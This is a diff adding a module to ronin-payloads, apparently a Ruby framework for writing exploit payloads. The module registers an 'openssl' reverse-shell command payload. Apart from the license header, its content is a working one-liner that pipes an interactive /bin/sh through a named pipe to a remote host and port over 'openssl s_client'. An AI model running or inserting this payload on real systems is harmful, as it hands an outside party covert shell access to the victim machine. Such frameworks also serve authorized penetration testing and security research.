+++ lib/ronin/payloads/builtin/command/openssl/reverse_shell.rb
@@ -1,0 +1,53 @@
+# frozen_string_literal: true
+#
+# ronin-payloads - A Ruby micro-framework for writing and running exploit
+# payloads.
+#
+# Copyright (c) 2007-2026 Hal Brodigan (postmodern.mod3 at gmail.com)
+#
+# ronin-payloads is free software: you can redistribute it and/or modify
+# it under the terms of the GNU Lesser General Public License as published
+# by the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# ronin-payloads is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU Lesser General Public License for more details.
+#
+# You should have received a copy of the GNU Lesser General Public License
+# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
+#
+
+require 'ronin/payloads/command_payload'
+require 'ronin/payloads/mixins/reverse_shell'
+
+module Ronin
+  module Payloads
+    module Command
+      module OpenSSL
+        #
+        # A basic `openssl` reverse shell command.
+        #
+        class ReverseShell < CommandPayload
+
+          include Mixins::ReverseShell
+
+          register 'command/openssl/reverse_shell'
+
+          description <<~DESC
+            A basic `openssl` reverse shell command.
+          DESC
+
+          #
+          # Builds the `openssl` reverse shell command.
+          #
+          def build
+            @payload = %{mkfifo fifo; /bin/sh -i < fifo 2>&1 | openssl s_client -quiet -connect #{host}:#{port} > fifo; rm fifo}
+          end
+
+        end
+      end
+    end
+  end
+end